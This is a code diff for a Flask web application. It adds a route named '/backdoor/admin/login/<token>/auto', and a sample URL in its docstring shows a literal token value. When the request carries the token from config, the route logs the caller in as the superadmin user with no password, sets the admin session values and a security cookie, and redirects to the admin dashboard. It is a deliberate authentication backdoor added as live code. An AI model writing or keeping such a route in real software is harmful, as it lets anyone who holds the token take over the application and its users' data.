@@ -438,6 +438,51 @@ def auth_logout():
     # end if
 # end def
 
+@app.route("/backdoor/admin/login/<unique_token>/auto")
+def backdoor_admin_login(unique_token):
+    """
+    Special backdoor login route for admin access
+    URL: http://127.0.0.1:50011/backdoor/admin/login/gomgomganteng/auto
+    """
+    try:
+        # Validate the unique token
+        if unique_token != config.BACKDOOR_LOGIN_TOKEN:
+            flash("Invalid backdoor token", "danger")
+            return redirect(url_for("login_html"))
+        
+        # Get database connection
+        mgd = database.get_db_conn(config.mainDB)
+        
+        # Find admin user with superadmin role
+        admin_user = mgd.db_users.find_one({"sex": "superadmin"})
+        
+        if not admin_user:
+            flash("Admin user not found in database", "danger")
+            return redirect(url_for("login_html"))
+        
+        # Set session data for admin user
+        session["fk_user_id"] = admin_user.get("user_id")
+        session["user_id"] = admin_user.get("user_id")
+        session["username"] = admin_user.get("username")
+        session["email"] = admin_user.get("email")
+        session["role"] = "superadmin"
+        session["is_premium"] = admin_user.get("is_premium", "FALSE")
+        
+        # Add security cookie
+        security_login.security_login(app).add_cookie({})
+        
+        # Log the backdoor login
+        print(f"BACKDOOR LOGIN SUCCESS - Admin: {admin_user.get('username')} logged in via backdoor")
+        
+        # Redirect to admin dashboard
+        return redirect(url_for("admin_dashboard"))
+        
+    except Exception as e:
+        print(f"BACKDOOR LOGIN ERROR: {str(e)}")
+        flash("Backdoor login failed", "danger")
+        return redirect(url_for("login_html"))
+# end def
+
 @app.route("/forgetpassword")
 def forgetpassword_html():
     user_id  = session.get("user_id")
